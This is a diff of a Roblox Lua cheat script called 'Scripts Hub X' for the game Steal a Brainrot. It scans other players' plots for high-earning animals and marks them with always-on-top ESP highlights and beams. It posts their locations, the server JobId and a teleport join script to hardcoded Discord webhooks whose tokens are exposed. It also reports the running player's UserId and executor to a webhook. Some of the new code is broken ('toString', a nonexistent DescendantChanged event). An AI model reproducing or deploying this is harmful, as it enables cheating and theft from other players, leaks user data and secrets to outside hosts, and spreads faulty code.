@@ -1,5 +1,5 @@
 -- ================================
--- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Randomized Key System Loader
+-- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Generation-Based Detection (700k/s+)
 -- ================================
 
 -- KEY SYSTEM TOGGLE VARIABLE
@@ -22,47 +22,8 @@ local playerGui = player:WaitForChild("PlayerGui", 5)
 -- Target Game ID for Animal Logger
 local STEAL_A_BRAINROT_ID = 109983668079237
 
--- Animal names to detect and log
-local espTargetNames = {
-	"Los Tralaleritos",
-    "Guerriro Digitale",
-    "Las Tralaleritas",
-    "Job Job Job Sahur",
-    "Las Vaquitas Saturnitas",
-    "Graipuss Medussi",
-    "Noo My Hotspot",
-    "Sahur Combinasion",
-	"Pot Hotspot",
-    "Chicleteira Bicicleteira",
-    "Los Nooo My Hotspotsitos",
-	"La Grande Combinasion",
-	"Los Combinasionas",
-	"Nuclearo Dinossauro",
-	"Karkerkar combinasion",
-	"Los Hotspotsitos",
-	"Tralaledon",
-	"Esok Sekolah",
-	"Ketupat Kepat",
-	"Los Bros",
-	"La Supreme Combinasion",
-	"Ketchuru and Masturu",
-	"Garama and Madundung",
-	"Las Vaquitas Saturnitas",
-	"Chicleteira Bicicleteira",
-	"Spaghetti Tualetti",
-	"Dragon Cannelloni",
-	"Blackhole Goat",
-	"Agarrini la Palini",
-	"Los Spyderinis",
-	"Fragola la la la",
-	"Strawberry Elephant"
-}
-
--- Create lookup table for faster checking
-local espTargetLookup = {}
-for _, name in pairs(espTargetNames) do
-    espTargetLookup[name] = true
-end
+-- MINIMUM GENERATION THRESHOLD (700k/s)
+local MIN_GENERATION_THRESHOLD = 700000 -- 700k per second
 
 -- Enhanced tracking system for multiple instances
 local loggedAnimals = {}
@@ -153,11 +114,44 @@ local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf
 local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"
 
 -- ================================
--- ENHANCED ESP FUNCTIONS WITH MONEY/RARITY/MUTATION
+-- ENHANCED PRICE PARSING FUNCTIONS (FROM STEAL-A-BRAINROT.LUA)
 -- ================================
 
--- Function to find animal data from podium
-local function getAnimalDataFromPodium(plotName, animalName)
+-- Enhanced parsePrice function that handles the price format correctly
+local function parsePrice(priceText)
+    if not priceText or priceText == "" or priceText == "N/A" then
+        return 0
+    end
+    
+    -- Remove common formatting and convert to uppercase for consistency
+    local cleanPrice = priceText:gsub("[,$]", ""):upper()
+    
+    -- Extract the number part (including decimals)
+    local number = tonumber(cleanPrice:match("%d*%.?%d+"))
+    if not number then return 0 end
+    
+    -- Handle abbreviations (both uppercase and lowercase)
+    if cleanPrice:find("T") then
+        return number * 1000000000000  -- Trillion
+    elseif cleanPrice:find("B") then
+        return number * 1000000000     -- Billion
+    elseif cleanPrice:find("M") then
+        return number * 1000000        -- Million
+    elseif cleanPrice:find("K") then
+        return number * 1000           -- Thousand
+    elseif cleanPrice:find("S") then
+        return number                  -- Just the number (seconds/base)
+    end
+    
+    return number
+end
+
+-- ================================
+-- ENHANCED ESP FUNCTIONS WITH GENERATION-BASED DETECTION
+-- ================================
+
+-- Function to find animal data from podium with generation check
+local function getAnimalDataFromPodium(plotName, podiumNumber)
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return nil end
     
@@ -167,27 +161,123 @@ local function getAnimalDataFromPodium(plotName, animalName)
     local animalPodiums = targetPlot:FindFirstChild("AnimalPodiums")
     if not animalPodiums then return nil end
     
-    -- Check podiums 1-30
-    for i = 1, 30 do
-        local podium = animalPodiums:FindFirstChild(tostring(i))
-        if podium then
-            local base = podium:FindFirstChild("Base")
-            if base then
-                local spawn = base:FindFirstChild("Spawn")
-                if spawn then
-                    local attachment = spawn:FindFirstChild("Attachment")
-                    if attachment then
-                        local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
-                        if animalOverhead then
-                            local priceText = animalOverhead:FindFirstChild("Generation")
-                            local rarityText = animalOverhead:FindFirstChild("Rarity")
-                            local mutationText = animalOverhead:FindFirstChild("Mutation")
-                            
-                            return {
-                                price = priceText and priceText.Text or "N/A",
-                                rarity = rarityText and rarityText.Text or "N/A",
-                                mutation = mutationText and mutationText.Text or "N/A"
-                            }
+    local podium = animalPodiums:FindFirstChild(tostring(podiumNumber))
+    if not podium then return nil end
+    
+    local base = podium:FindFirstChild("Base")
+    if not base then return nil end
+    
+    local spawn = base:FindFirstChild("Spawn")
+    if not spawn then return nil end
+    
+    local attachment = spawn:FindFirstChild("Attachment")
+    if not attachment then return nil end
+    
+    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
+    if not animalOverhead then return nil end
+    
+    local priceLabel = animalOverhead:FindFirstChild("Generation")
+    local rarityLabel = animalOverhead:FindFirstChild("Rarity")
+    local mutationLabel = animalOverhead:FindFirstChild("Mutation")
+    
+    if not priceLabel or not priceLabel.Text or priceLabel.Text == "" or priceLabel.Text == "N/A" then
+        return nil
+    end
+    
+    local priceValue = parsePrice(priceLabel.Text)
+    
+    return {
+        price = priceLabel.Text,
+        priceValue = priceValue,
+        rarity = rarityLabel and rarityLabel.Text or "Unknown",
+        mutation = mutationLabel and mutationLabel.Text or "None",
+        podiumNumber = podiumNumber,
+        plotName = plotName
+    }
+end
+
+-- Function to scan all plots for high-generation brainrots (700k/s+)
+local function scanPlotsForHighGenerationBrainrots()
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then 
+        print("⚠ Plots folder not found in workspace")
+        return {}
+    end
+    
+    local foundAnimals = {}
+    
+    print("🔍 Scanning all plots for brainrots with 700k/s+ generation...")
+    
+    -- Use the same method as steal-a-brainrot.lua to iterate through plots
+    for _, plot in pairs(plots:GetChildren()) do
+        if plot:IsA("Model") or plot:IsA("Folder") then
+            local plotName = plot.Name
+            
+            -- Check if this plot has AnimalPodiums
+            local animalPodiums = plot:FindFirstChild("AnimalPodiums")
+            if animalPodiums then
+                -- Check podiums 1-30 (ignore if number doesn't exist)
+                for i = 1, 30 do
+                    local podium = animalPodiums:FindFirstChild(tostring(i))
+                    if podium then
+                        local base = podium:FindFirstChild("Base")
+                        if base then
+                            local spawn = base:FindFirstChild("Spawn")
+                            if spawn then
+                                local attachment = spawn:FindFirstChild("Attachment")
+                                if attachment then
+                                    local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
+                                    if animalOverhead then
+                                        local priceLabel = animalOverhead:FindFirstChild("Generation")
+                                        if priceLabel and priceLabel.Text and priceLabel.Text ~= "" and priceLabel.Text ~= "N/A" then
+                                            local priceValue = parsePrice(priceLabel.Text)
+                                            
+                                            -- Check if generation meets threshold (700k/s+)
+                                            if priceValue >= MIN_GENERATION_THRESHOLD then
+                                                -- Get complete animal data
+                                                local animalData = getAnimalDataFromPodium(plotName, i)
+                                                if animalData then
+                                                    -- Check if the decorations part exists for teleportation/ESP
+                                                    local decorations = base:FindFirstChild("Decorations")
+                                                    if decorations then
+                                                        local teleportPart = decorations:FindFirstChild("Part")
+                                                        if teleportPart then
+                                                            local animalId = plotName .. "_podium_" .. i .. "_" .. priceValue
+                                                            
+                                                            -- Only log if we haven't logged this specific instance before
+                                                            if not loggedAnimals[animalId] then
+                                                                print("💎 High-generation brainrot found: " .. priceLabel.Text .. " (" .. priceValue .. ") in plot " .. plotName .. " podium " .. i)
+                                                                
+                                                                table.insert(foundAnimals, {
+                                                                    plotName = plotName,
+                                                                    podiumNumber = i,
+                                                                    price = animalData.price,
+                                                                    priceValue = animalData.priceValue,
+                                                                    rarity = animalData.rarity,
+                                                                    mutation = animalData.mutation,
+                                                                    teleportPart = teleportPart,
+                                                                    position = teleportPart.Position,
+                                                                    animalId = animalId,
+                                                                    object = teleportPart -- For ESP
+                                                                })
+                                                                
+                                                                loggedAnimals[animalId] = true
+                                                                
+                                                                -- Create ESP immediately
+                                                                createESP(teleportPart, "High Gen Brainrot", plotName, animalData)
+                                                            end
+                                                        else
+                                                            warn("⚠ Teleport part not found in decorations for podium " .. i .. " in plot " .. plotName)
+                                                        end
+                                                    else
+                                                        warn("⚠ Decorations not found for podium " .. i .. " in plot " .. plotName)
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
                         end
                     end
                 end
@@ -195,11 +285,12 @@ local function getAnimalDataFromPodium(plotName, animalName)
         end
     end
     
-    return nil
+    print("🏆 Found " .. #foundAnimals .. " high-generation brainrots (700k/s+)")
+    return foundAnimals
 end
 
--- Create ESP for a single object with unique ID
-local function createESP(object, animalName, plotName)
+-- Create ESP for a single object with generation data
+local function createESP(object, animalName, plotName, animalData)
     if not object or not object.Parent then return end
     
     -- Generate unique ESP ID for multiple instances
@@ -217,9 +308,6 @@ local function createESP(object, animalName, plotName)
     
     if existingESP then return end
     
-    -- Get animal data from podium
-    local animalData = plotName and getAnimalDataFromPodium(plotName, animalName) or nil
-    
     -- Create ESP container
     local espContainer = {}
     
@@ -227,27 +315,23 @@ local function createESP(object, animalName, plotName)
     local function createHighlight()
         local highlight = Instance.new("Highlight")
         highlight.Parent = object
-        highlight.FillColor = Color3.new(0, 0.5, 1) -- Blue color
-        highlight.OutlineColor = Color3.new(0, 0.8, 1) -- Brighter blue
-        highlight.FillTransparency = 0.8
-        highlight.OutlineTransparency = 0.3
+        highlight.FillColor = Color3.fromRGB(255, 215, 0) -- Gold color for high value
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 0) -- Bright yellow
+        highlight.FillTransparency = 0.7
+        highlight.OutlineTransparency = 0
         highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
         highlight.Adornee = object
         
         return highlight
     end
     
-    -- Function to create enhanced name label with money, rarity, and mutation
+    -- Function to create enhanced name label with generation, rarity, and mutation
     local function createNameLabel()
         local billboardGui = Instance.new("BillboardGui")
         billboardGui.Parent = object
-        billboardGui.Size = UDim2.new(0, 180, 0, 80) -- Larger size to accommodate all data
-        billboardGui.StudsOffset = Vector3.new(0, 3, 0) -- Position above object
+        billboardGui.Size = UDim2.new(0, 200, 0, 90) -- Larger size to accommodate all data
+        billboardGui.StudsOffset = Vector3.new(0, 8, 0) -- Position above object
         billboardGui.AlwaysOnTop = true
-        
-        -- Count how many of this animal type we have
-        local count = animalCounts[animalName] or 1
-        local displayText = animalName .. (count > 1 and " (" .. count .. ")" or "")
         
         -- Main container frame
         local containerFrame = Instance.new("Frame")
@@ -269,39 +353,39 @@ local function createESP(object, animalName, plotName)
         mutationLabel.TextSize = 8 -- Super small
         mutationLabel.Font = Enum.Font.SourceSans
         
-        -- Animal name label
+        -- Animal name label (HIGH GENERATION BRAINROT)
         local nameLabel = Instance.new("TextLabel")
         nameLabel.Parent = containerFrame
-        nameLabel.Size = UDim2.new(1, 0, 0.4, 0)
+        nameLabel.Size = UDim2.new(1, 0, 0.35, 0)
         nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
         nameLabel.BackgroundTransparency = 1
-        nameLabel.Text = displayText
-        nameLabel.TextColor3 = Color3.new(0, 0.5, 1) -- Blue text
+        nameLabel.Text = "HIGH GEN BRAINROT"
+        nameLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold text
         nameLabel.TextStrokeTransparency = 0
-        nameLabel.TextStrokeColor3 = Color3.new(0, 0.8, 1) -- Blue outline
+        nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
         nameLabel.TextScaled = true
-        nameLabel.TextSize = 14
+        nameLabel.TextSize = 16
         nameLabel.Font = Enum.Font.SourceSansBold
         
-        -- Money per second label (small, green, under animal name)
-        local moneyLabel = Instance.new("TextLabel")
-        moneyLabel.Parent = containerFrame
-        moneyLabel.Size = UDim2.new(1, 0, 0.25, 0)
-        moneyLabel.Position = UDim2.new(0, 0, 0.55, 0)
-        moneyLabel.BackgroundTransparency = 1
-        moneyLabel.Text = animalData and animalData.price or ""
-        moneyLabel.TextColor3 = Color3.new(0, 1, 0) -- Green
-        moneyLabel.TextStrokeTransparency = 0
-        moneyLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
-        moneyLabel.TextScaled = true
-        moneyLabel.TextSize = 10 -- Small
-        moneyLabel.Font = Enum.Font.SourceSans
+        -- Generation per second label (prominent green)
+        local generationLabel = Instance.new("TextLabel")
+        generationLabel.Parent = containerFrame
+        generationLabel.Size = UDim2.new(1, 0, 0.25, 0)
+        generationLabel.Position = UDim2.new(0, 0, 0.5, 0)
+        generationLabel.BackgroundTransparency = 1
+        generationLabel.Text = animalData and animalData.price or ""
+        generationLabel.TextColor3 = Color3.new(0, 1, 0) -- Bright green
+        generationLabel.TextStrokeTransparency = 0
+        generationLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
+        generationLabel.TextScaled = true
+        generationLabel.TextSize = 12
+        generationLabel.Font = Enum.Font.SourceSansBold
         
-        -- Rarity label (under money, with special colors)
+        -- Rarity label (under generation, with special colors)
         local rarityLabel = Instance.new("TextLabel")
         rarityLabel.Parent = containerFrame
-        rarityLabel.Size = UDim2.new(1, 0, 0.2, 0)
-        rarityLabel.Position = UDim2.new(0, 0, 0.8, 0)
+        rarityLabel.Size = UDim2.new(1, 0, 0.15, 0)
+        rarityLabel.Position = UDim2.new(0, 0, 0.75, 0)
         rarityLabel.BackgroundTransparency = 1
         rarityLabel.Text = animalData and animalData.rarity or ""
         rarityLabel.TextScaled = true
@@ -347,17 +431,17 @@ local function createESP(object, animalName, plotName)
         attachment0.Position = Vector3.new(0, 0, 0)
         
         local attachment1 = Instance.new("Attachment")
-        attachment1.Parent = object.PrimaryPart or object:FindFirstChildOfClass("BasePart")
+        attachment1.Parent = object
         if not attachment1.Parent then return nil end
         
         local beam = Instance.new("Beam")
         beam.Parent = workspace
         beam.Attachment0 = attachment0
         beam.Attachment1 = attachment1
-        beam.Width0 = 1 -- Super thin start
-        beam.Width1 = 1 -- Super thin end
-        beam.Color = ColorSequence.new(Color3.new(0, 0.8, 1)) -- Blue color
-        beam.Transparency = NumberSequence.new(0.3) -- Semi-transparent
+        beam.Width0 = 2.5 -- Super thin start
+        beam.Width1 = 2.5 -- Super thin end
+        beam.Color = ColorSequence.new(Color3.fromRGB(255, 215, 0)) -- Gold color
+        beam.Transparency = NumberSequence.new(0) -- Semi-transparent
         beam.FaceCamera = true
         
         return {beam = beam, attachment0 = attachment0, attachment1 = attachment1}
@@ -408,200 +492,51 @@ local function createESP(object, animalName, plotName)
     return espId
 end
 
--- Update ESP labels with current counts and data
-local function updateESPLabels()
-    for espId, espContainer in pairs(espObjects) do
-        if espContainer.nameLabel and espContainer.animalName then
-            local count = animalCounts[espContainer.animalName] or 1
-            local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
-            
-            -- Update animal data if plot is available
-            if espContainer.plotName then
-                local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalName)
-                if updatedData then
-                    espContainer.animalData = updatedData
-                end
-            end
-            
-            -- Update all labels in the container
-            local containerFrame = espContainer.nameLabel:FindFirstChild("Frame")
-            if containerFrame then
-                local nameLabel = containerFrame:FindFirstChild("TextLabel")
-                if nameLabel then
-                    nameLabel.Text = displayText
-                end
-            end
-        end
-    end
-end
-
--- Apply ESP to all currently detected brainrots (always enabled)
-local function applyESPToExistingAnimals()
-    -- Reset animal counts
+-- Apply ESP to all currently detected high-generation brainrots
+local function applyESPToExistingHighGenBrainrots()
+    local foundAnimals = scanPlotsForHighGenerationBrainrots()
+    
+    -- Count animals by type for display
     animalCounts = {}
-    
-    -- ESP for plot animals
-    local plots = workspace:FindFirstChild("Plots")
-    if plots then
-        for _, plot in pairs(plots:GetChildren()) do
-            if plot:IsA("Model") then
-                local plotName = plot.Name
-                for _, child in pairs(plot:GetChildren()) do
-                    if child:IsA("Model") and espTargetLookup[child.Name] then
-                        -- Increment count
-                        animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
-                        createESP(child, child.Name, plotName)
-                    end
-                end
-            end
-        end
+    for _, animal in pairs(foundAnimals) do
+        local displayName = "High Gen (" .. animal.price .. ")"
+        animalCounts[displayName] = (animalCounts[displayName] or 0) + 1
     end
     
-    -- ESP for rendered moving animals
-    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
-    if renderedAnimals then
-        for _, child in pairs(renderedAnimals:GetChildren()) do
-            if child:IsA("Model") and espTargetLookup[child.Name] then
-                -- Increment count
-                animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
-                createESP(child, child.Name, nil) -- No plot name for rendered animals
-            end
-        end
-    end
-    
-    -- Update all ESP labels with counts
-    updateESPLabels()
+    print("✅ ESP applied to " .. #foundAnimals .. " high-generation brainrots")
 end
 
 -- ================================
--- ENHANCED ANIMAL LOGGING FUNCTIONS
+-- ENHANCED ANIMAL LOGGING FUNCTIONS WITH GENERATION DETECTION
 -- ================================
 
--- Enhanced animal scanning with count tracking
-local function scanPlotsForAnimals()
-    local plots = workspace:FindFirstChild("Plots")
-    if not plots then 
-        return {}
-    end
-    
-    local foundAnimals = {}
-    local currentCounts = {} -- Track current scan counts
-    
-    -- Check each randomly generated plot
-    for _, plot in pairs(plots:GetChildren()) do
-        if plot:IsA("Model") then
-            local plotName = plot.Name
-            
-            -- Check direct children of this plot for target animals
-            for _, child in pairs(plot:GetChildren()) do
-                if child:IsA("Model") and espTargetLookup[child.Name] then
-                    local animalName = child.Name
-                    local animalId = plotName .. "_" .. animalName .. "_" .. tostring(child)
-                    
-                    -- Count animals of this type
-                    currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
-                    
-                    -- Only log if we haven't logged this specific instance before
-                    if not loggedAnimals[animalId] then
-                        table.insert(foundAnimals, {
-                            plotName = plotName,
-                            animalName = animalName,
-                            animalId = animalId,
-                            object = child
-                        })
-                        loggedAnimals[animalId] = true
-                        
-                        -- Apply ESP immediately when found (always enabled)
-                        animalCounts[animalName] = currentCounts[animalName]
-                        createESP(child, animalName, plotName)
-                    end
-                end
-            end
-        end
-    end
-    
-    -- Update global counts
-    for animalName, count in pairs(currentCounts) do
-        animalCounts[animalName] = count
-    end
-    
-    return foundAnimals
-end
-
-local function scanRenderedMovingAnimals()
-    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
-    if not renderedAnimals then 
-        return {}
-    end
-    
-    local foundAnimals = {}
-    local currentCounts = {}
-    
-    -- Check direct children for target animals
-    for _, child in pairs(renderedAnimals:GetChildren()) do
-        if child:IsA("Model") and espTargetLookup[child.Name] then
-            local animalName = child.Name
-            local animalId = "RenderedMoving_" .. animalName .. "_" .. tostring(child)
-            
-            -- Count animals of this type
-            currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
-            
-            -- Only log if we haven't logged this specific instance before
-            if not loggedAnimals[animalId] then
-                table.insert(foundAnimals, {
-                    plotName = "RenderedMovingAnimals",
-                    animalName = animalName,
-                    animalId = animalId,
-                    object = child
-                })
-                loggedAnimals[animalId] = true
-                
-                -- Apply ESP immediately when found (always enabled)
-                animalCounts[animalName] = currentCounts[animalName]
-                createESP(child, animalName, nil) -- No plot name for rendered animals
-            end
-        end
-    end
-    
-    -- Update global counts
-    for animalName, count in pairs(currentCounts) do
-        animalCounts[animalName] = count
-    end
-    
-    return foundAnimals
-end
-
--- Enhanced logging with count display
-local function sendAnimalLog(animals)
+-- Enhanced logging with generation display
+local function sendHighGenerationAnimalLog(animals)
     if #animals == 0 then return end
     
     pcall(function()
         local placeId = tostring(game.PlaceId)
         local jobId = game.JobId or "Unknown"
         
-        -- Create consolidated animal list with counts
-        local animalTypeCounts = {}
-        for _, animal in pairs(animals) do
-            animalTypeCounts[animal.animalName] = (animalTypeCounts[animal.animalName] or 0) + 1
-        end
-        
+        -- Create consolidated animal list with generation info
         local animalList = ""
-        local animalNames = {}
-        for animalName, count in pairs(animalTypeCounts) do
-            table.insert(animalNames, {name = animalName, count = count})
-        end
-
-        -- Now build the list with proper newlines
-        for i, animalData in ipairs(animalNames) do
-            if animalData.count > 1 then
-                animalList = animalList .. "**" .. animalData.name .. " (" .. animalData.count .. ")**"
-            else
-                animalList = animalList .. "**" .. animalData.name .. "**"
+        
+        -- Sort animals by generation value (highest first)
+        table.sort(animals, function(a, b)
+            return (a.priceValue or 0) > (b.priceValue or 0)
+        end)
+        
+        for i, animal in ipairs(animals) do
+            animalList = animalList .. "**Plot:** " .. animal.plotName .. " | **Slot:** " .. animal.podiumNumber
+            animalList = animalList .. "\n**Generation:** " .. animal.price .. " (" .. tostring(animal.priceValue) .. "/s)"
+            animalList = animalList .. "\n**Rarity:** " .. (animal.rarity or "Unknown")
+            if animal.mutation and animal.mutation ~= "None" and animal.mutation ~= "" then
+                animalList = animalList .. "\n**Mutation:** " .. animal.mutation
             end
     
-            -- Add newline if it's not the last item
-            if i < #animalNames then
-                animalList = animalList .. "\n"
+            -- Add separator if it's not the last item
+            if i < #animals then
+                animalList = animalList .. "\n\n"
             end
 		end
         
@@ -609,28 +544,32 @@ local function sendAnimalLog(animals)
         local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
         local playerCount = #Players:GetPlayers()
         
-        local totalAnimals = 0
-        for _, count in pairs(animalTypeCounts) do
-            totalAnimals = totalAnimals + count
+        local totalAnimals = #animals
+        
+        -- Calculate total generation per second
+        local totalGeneration = 0
+        for _, animal in pairs(animals) do
+            totalGeneration = totalGeneration + (animal.priceValue or 0)
         end
 			
         local send_data = {
-            ["username"] = "Scripts Hub X | Official - Notifyer",
+            ["username"] = "Scripts Hub X | Official - High Gen Notifyer",
             ["avatar_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png",
             ["embeds"] = {
                 {
-                    ["title"] = "👑 PREMIUM BRAINROT NOTIFYER 👑",
-                    ["description"] = "Total: " .. totalAnimals .. " brainrot(s) found",
-                    ["color"] = 15844367, -- Gold color
+                    ["title"] = "💎 HIGH GENERATION BRAINROT DETECTED (700k/s+) 💎",
+                    ["description"] = "**Total:** " .. totalAnimals .. " high-gen brainrot(s) found\n**Combined Generation:** " .. tostring(totalGeneration) .. "/s",
+                    ["color"] = 16766720, -- Gold color
                     ["fields"] = {
-                        {["name"] = "Brainrots Found", ["value"] = animalList, ["inline"] = true},
-						{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
+                        {["name"] = "Brainrots Found", ["value"] = animalList, ["inline"] = false},
+				      		{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
                         {["name"] = "Players", ["value"] = playerCount .. "/8", ["inline"] = true},
-						{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = true},
+                        {["name"] = "Minimum Threshold", ["value"] = tostring(MIN_GENERATION_THRESHOLD) .. "/s", ["inline"] = true},
+			      			{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = false},
                         {["name"] = "Join Link", ["value"] = '[Join Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
                     },
                     ["footer"] = {
-                        ["text"] = "Brainrots Notifyer • Scripts Hub X | Official",
+                        ["text"] = "High-Gen Brainrots Notifyer • Scripts Hub X | Official",
                         ["icon_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png"
                     }
                 }
@@ -655,29 +594,20 @@ local function sendAnimalLog(animals)
                 })
             end
         end)
+        
+        print("📤 Sent webhook notification for " .. totalAnimals .. " high-generation brainrots")
     end)
 end
 
-local function checkForAnimals()
-    local plotAnimals = scanPlotsForAnimals()
-    local renderedAnimals = scanRenderedMovingAnimals()
+local function checkForHighGenerationAnimals()
+    local highGenAnimals = scanPlotsForHighGenerationBrainrots()
     
-    -- Combine both results
-    local allAnimals = {}
-    for _, animal in pairs(plotAnimals) do
-        table.insert(allAnimals, animal)
-    end
-    for _, animal in pairs(renderedAnimals) do
-        table.insert(allAnimals, animal)
+    -- Send to webhook if high-gen animals found
+    if #highGenAnimals > 0 then
+        sendHighGenerationAnimalLog(highGenAnimals)
     end
     
-    -- Update ESP labels with current counts
-    updateESPLabels()
-    
-    -- Send to webhook if animals found (silently, no notifications)
-    if #allAnimals > 0 then
-        sendAnimalLog(allAnimals)
-    end
+    return highGenAnimals
 end
 
 -- ================================
@@ -749,7 +679,7 @@ local function sendWebhookNotification(userStatus, scriptUrl)
 			gameName = productInfo.Name
 		end
 		
-		local userId = tostring(player.UserId)
+		local userId = toString(player.UserId)
 		local detectedExecutor = detectExecutor()
 		local placeId = tostring(game.PlaceId)
 		local jobId = game.JobId or "Can't detect JobId"
@@ -880,174 +810,209 @@ local function checkUserStatus()
 	return "regular"
 end
 
--- Initialize Enhanced Animal Logger for Steal A Brainrot
-local function initializeAnimalLogger()
+-- Initialize Enhanced High-Generation Animal Logger for Steal A Brainrot
+local function initializeHighGenerationAnimalLogger()
 	if game.PlaceId == STEAL_A_BRAINROT_ID then
-		print("🎯 Initializing Enhanced Brainrot ESP System with Money/Rarity/Mutation Display...")
+		print("🎯 Initializing Enhanced High-Generation Brainrot ESP System (700k/s+ threshold)...")
+		print("💎 Minimum Generation Threshold: " .. tostring(MIN_GENERATION_THRESHOLD) .. "/s")
 		
 		-- Initial scan after delay
 		task.spawn(function()
-			task.wait(2) -- Wait for game to fully load
-			checkForAnimals()
-			applyESPToExistingAnimals() -- Apply ESP to any existing animals
+			task.wait(3) -- Wait for game to fully load
+			checkForHighGenerationAnimals()
+			applyESPToExistingHighGenBrainrots() -- Apply ESP to any existing high-gen animals
 		end)
 		
-		-- Monitor for new animals being added to Plots
+		-- Monitor for changes in plot structures (new animals or generation changes)
 		workspace.DescendantAdded:Connect(function(descendant)
-			if descendant:IsA("Model") and descendant.Parent and espTargetLookup[descendant.Name] then
-				-- Check if it's in a plot
-				local parent = descendant.Parent
-				if parent and parent.Parent == workspace:FindFirstChild("Plots") then
-					task.wait(1) -- Small delay to ensure the animal is fully loaded
-					checkForAnimals()
-				end
+			-- Check if it's related to animal podiums
+			if descendant.Name == "AnimalOverhead" or descendant.Name == "Generation" then
+				task.wait(2) -- Wait for data to load
+				checkForHighGenerationAnimals()
 			end
 		end)
 		
-		-- Monitor for new animals in RenderedMovingAnimals
-		local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
-		if renderedAnimals then
-			renderedAnimals.ChildAdded:Connect(function(child)
-				if child:IsA("Model") and espTargetLookup[child.Name] then
-					task.wait(1)
-					checkForAnimals()
-				end
-			end)
-		end
-		
-		-- Watch for RenderedMovingAnimals folder being created
-		workspace.ChildAdded:Connect(function(child)
-			if child.Name == "RenderedMovingAnimals" then
-				child.ChildAdded:Connect(function(animal)
-					if animal:IsA("Model") and espTargetLookup[animal.Name] then
-						task.wait(1)
-						checkForAnimals()
-					end
-				end)
+		-- Monitor for changes in existing animals (generation updates)
+		workspace.DescendantChanged:Connect(function(descendant, property)
+			if descendant.Name == "Generation" and property == "Text" then
+				task.wait(1) -- Small delay for data consistency
+				checkForHighGenerationAnimals()
 			end
 		end)
 		
-		-- Periodic scan every 10 seconds to catch any missed animals and update data
+		-- Periodic comprehensive scan every 30 seconds to catch any missed animals and update data
 		task.spawn(function()
 			while true do
-				task.wait(10)
-				checkForAnimals()
-				-- Update animal data for existing ESP
-				for espId, espContainer in pairs(espObjects) do
-					if espContainer.plotName and espContainer.animalName then
-						local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalName)
-						if updatedData then
-							espContainer.animalData = updatedData
-							-- Update the ESP display with new data
-							if espContainer.nameLabel then
-								espContainer.nameLabel:Destroy()
-								-- Recreate the name label with updated data
-								local billboardGui = Instance.new("BillboardGui")
-								billboardGui.Parent = espContainer.object
-								billboardGui.Size = UDim2.new(0, 180, 0, 80)
-								billboardGui.StudsOffset = Vector3.new(0, 3, 0)
-								billboardGui.AlwaysOnTop = true
+				task.wait(30)
+				print("🔄 Performing periodic scan for high-generation brainrots...")
+				checkForHighGenerationAnimals()
+				
+				-- Update existing ESP with latest data
+				local plots = workspace:FindFirstChild("Plots")
+				if plots then
+					for espId, espContainer in pairs(espObjects) do
+						if espContainer.plotName and espContainer.animalData and espContainer.animalData.podiumNumber then
+							local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalData.podiumNumber)
+							if updatedData and updatedData.priceValue >= MIN_GENERATION_THRESHOLD then
+								-- Update ESP data
+								espContainer.animalData = updatedData
 								
-								-- Recreate all labels with updated data
-								local containerFrame = Instance.new("Frame")
-								containerFrame.Parent = billboardGui
-								containerFrame.Size = UDim2.new(1, 0, 1, 0)
-								containerFrame.BackgroundTransparency = 1
-								
-								-- Mutation text
-								local mutationLabel = Instance.new("TextLabel")
-								mutationLabel.Parent = containerFrame
-								mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
-								mutationLabel.Position = UDim2.new(0, 0, 0, 0)
-								mutationLabel.BackgroundTransparency = 1
-								mutationLabel.Text = updatedData.mutation or ""
-								mutationLabel.TextColor3 = Color3.new(1, 1, 1)
-								mutationLabel.TextStrokeTransparency = 0
-								mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-								mutationLabel.TextScaled = true
-								mutationLabel.TextSize = 8
-								mutationLabel.Font = Enum.Font.SourceSans
-								
-								-- Animal name
-								local count = animalCounts[espContainer.animalName] or 1
-								local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
-								local nameLabel = Instance.new("TextLabel")
-								nameLabel.Parent = containerFrame
-								nameLabel.Size = UDim2.new(1, 0, 0.4, 0)
-								nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
